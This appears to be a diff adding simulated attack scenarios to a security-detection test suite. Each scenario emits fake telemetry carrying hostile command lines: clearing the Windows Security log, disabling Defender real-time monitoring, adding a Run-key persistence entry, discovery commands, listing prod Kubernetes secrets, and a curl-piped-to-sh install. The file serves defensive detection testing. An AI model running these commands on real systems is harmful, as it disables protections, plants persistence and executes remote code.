@@ -168,6 +168,30 @@ SCENARIOS: dict[str, Scenario] = {
     "k8s_cluster_admin_binding": Scenario(
         "Binding to cluster-admin", "A ClusterRoleBinding grants cluster-admin.", "kubernetes", ["DET-K8S-003"],
         lambda h, t: [k8s(h, t, "create", "clusterrolebindings", "tmp-admin", "", request={"roleRef": {"kind": "ClusterRole", "name": "cluster-admin"}})]),
+    "log_cleared": Scenario(
+        "Security event log cleared", "The Security log is cleared (event 1102).", "windows", ["DET-WIN-014"],
+        lambda h, t: [EventIn(source="windows", simulated=True, data={
+            "event_id": _sid(), "EventID": 1102, "Channel": "Security", "Computer": h, "TimeCreated": _iso(t),
+            "UserData": {"LogFileCleared": {"SubjectUserName": "jdoe", "SubjectDomainName": "CORP"}}})]),
+    "defender_tamper": Scenario(
+        "Defender real-time protection disabled", "PowerShell turns off Defender real-time monitoring.", "windows", ["DET-WIN-016"],
+        lambda h, t: [proc(h, t, PS, "powershell.exe -c Set-MpPreference -DisableRealtimeMonitoring $true", CMD, "CORP\\jdoe")]),
+    "run_key_persistence": Scenario(
+        "Run key added with reg.exe", "reg.exe adds an HKCU Run value pointing at C:\\Users\\Public.", "windows", ["DET-WIN-017"],
+        lambda h, t: [proc(h, t, "C:\\Windows\\System32\\reg.exe",
+                           "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Updater /d C:\\Users\\Public\\updater.exe",
+                           CMD, "CORP\\jdoe")]),
+    "discovery_burst": Scenario(
+        "Burst of discovery commands", "whoami, ipconfig, systeminfo and net run by one user within a minute.", "windows", ["DET-WIN-018"],
+        lambda h, t: [proc(h, t + timedelta(seconds=10 * i), f"C:\\Windows\\System32\\{exe}", cmd, CMD, "CORP\\jdoe")
+                      for i, (exe, cmd) in enumerate([("whoami.exe", "whoami /groups"), ("ipconfig.exe", "ipconfig /all"),
+                                                      ("systeminfo.exe", "systeminfo"), ("net.exe", "net user")])]),
+    "k8s_secret_listing": Scenario(
+        "Secrets listed by a user", "A developer identity lists Secrets in the prod namespace.", "kubernetes", ["DET-K8S-004"],
+        lambda h, t: [k8s(h, t, "list", "secrets", "", "prod")]),
+    "curl_pipe_shell": Scenario(
+        "Remote script piped to shell", "curl output piped straight into sh.", "linux", ["DET-LNX-003"],
+        lambda h, t: [linux_proc(h, t, "/usr/bin/curl", "curl -fsSL https://get.example.net/install.sh | sh", "/bin/bash", "deploy")]),
     "ssh_bruteforce": Scenario(
         "SSH password guessing", "8 failed SSH logins from one address.", "linux", ["DET-LNX-001"],
         lambda h, t: [syslog(h, t + timedelta(seconds=5 * i), f"Failed password for invalid user admin from 203.0.113.80 port {40000 + i} ssh2") for i in range(8)]),
